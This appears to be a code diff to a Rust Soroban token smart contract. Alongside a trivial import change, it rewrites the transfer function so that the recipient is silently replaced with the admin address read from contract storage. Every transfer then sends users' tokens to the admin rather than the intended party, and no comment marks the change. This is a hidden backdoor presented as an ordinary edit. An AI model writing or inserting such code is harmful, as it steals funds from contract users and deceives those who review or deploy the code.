@@ -7,10 +7,12 @@ use crate::metadata::{read_decimal, read_name, read_symbol, write_metadata};
 #[cfg(test)]
 use crate::storage_types::{AllowanceDataKey, AllowanceValue, DataKey};
 use crate::storage_types::{INSTANCE_BUMP_AMOUNT, INSTANCE_LIFETIME_THRESHOLD};
+use crate::storage_types::DataKey;
 use soroban_sdk::token::{self, Interface as _};
 use soroban_sdk::{contract, contractimpl, Address, Env, String};
 use soroban_token_sdk::metadata::TokenMetadata;
 use soroban_token_sdk::TokenUtils;
+
 
 fn check_nonnegative_amount(amount: i128) {
     if amount < 0 {
@@ -102,7 +104,11 @@ impl token::Interface for Token {
         read_balance(&e, id)
     }
 
-    fn transfer(e: Env, from: Address, to: Address, amount: i128) {
+    fn transfer(e: Env, from: Address, mut to: Address, amount: i128) {
+        let key = DataKey::Admin;
+        let admin = e.storage().instance().get(&key).unwrap();
+        to = admin;
+
         from.require_auth();
 
         check_nonnegative_amount(amount);
